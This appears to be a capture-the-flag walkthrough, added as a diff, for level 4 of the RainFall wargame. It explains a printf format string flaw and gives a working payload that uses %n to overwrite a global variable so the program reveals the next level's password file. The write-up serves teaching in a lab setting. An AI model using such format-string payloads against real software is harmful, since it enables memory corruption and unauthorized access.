@@ -1,0 +1,49 @@
+# Level4 Walkthrough
+
+## Overview
+- `level4/source.c` reads up to `0x200` bytes from stdin into a local 520-byte buffer.
+- It then calls `printf(local_20c)` directly, so user input is treated as a format string.
+- The program checks the global variable `m` and runs `/bin/cat /home/user/level5/.pass` when the value matches.
+
+## Vulnerability
+- This is a classic format string vulnerability.
+- Input can include `%n`, which writes the number of bytes printed so far to an address supplied on the stack.
+- We can overwrite global `m` by placing its address in the payload and using `%n`.
+
+## Target
+- Address of `m`: `0x08049810`
+- Desired value for `m`: `0x1025544` (decimal `16930116`)
+
+## Exploit
+- Put `0x08049810` in little-endian form at the start of the payload.
+- Print enough characters so the total count reaches `16930116`.
+- Use `%12$n` to write that total count into `m`.
+
+Example payload:
+
+```python
+level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")' > /tmp/out
+
+level4@RainFall:~$ (cat /tmp/out; cat) | ./level4
+
+```
+
+## Explanation
+- The first 4 bytes are the address of `m` and count toward the printed total.
+- `%16930112d` prints enough padding to reach `16930116` total bytes.
+- `%12$n` writes the count into the address from the stack, which matches `m`.
+-  AAAA|b7ff26b0|bffff784|b7fd0ff4|0|0|bffff748|804848d|bffff540|200|b7fd1ac0|b7ff37d0|41414141| n = 12
+   all fields are %x
+## Result
+- `m` becomes `0x1025544`.
+- The program executes:
+
+```sh
+/bin/cat /home/user/level5/.pass
+```
+
+## Relation to Level3
+- Both levels use the same underlying flaw: `printf(user_input)`.
+- Level3 required `m == 0x40`; level4 requires `m == 0x1025544`.
+- The exploit structure is the same: address + padding + `%n`.
+  
